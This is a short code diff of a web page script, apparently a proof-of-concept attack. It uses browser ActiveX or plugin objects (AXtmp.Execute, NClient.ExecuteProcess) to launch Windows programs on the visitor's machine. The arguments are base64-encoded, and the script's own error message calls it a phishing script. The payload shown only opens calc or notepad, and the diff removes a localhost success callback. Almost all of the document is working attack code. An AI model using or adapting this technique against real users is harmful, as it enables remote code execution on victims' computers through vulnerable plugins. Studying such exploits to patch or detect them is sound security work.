@@ -46,17 +46,12 @@
                 var success = false;
 
                 if (document.getElementById('AXtmp').object) {
-                    AXtmp.Execute("Qw==", "Y2FsYy5leGU=", "");
+                    AXtmp.Execute("Qw==", "bm90ZXBhZC5leGU=", "aWVvdXQ=");
                     success = true;
                 } else if (document.getElementById('NClient').object) {
-                    NClient.ExecuteProcess("c:\\windows\\system32\\notepad.exe");
+                    NClient.ExecuteProcess("c:\\windows\\system32\\notepad.exe ieout");
                     success = true;
                 }
-
-                // 성공 여부를 로컬 서버에 알림
-                var xhr = new XMLHttpRequest();
-                xhr.open("GET", "http://localhost:8080/check", true);
-                xhr.send();
                 
             } catch (e) {
                 console.error('Error executing phishing script:', e);
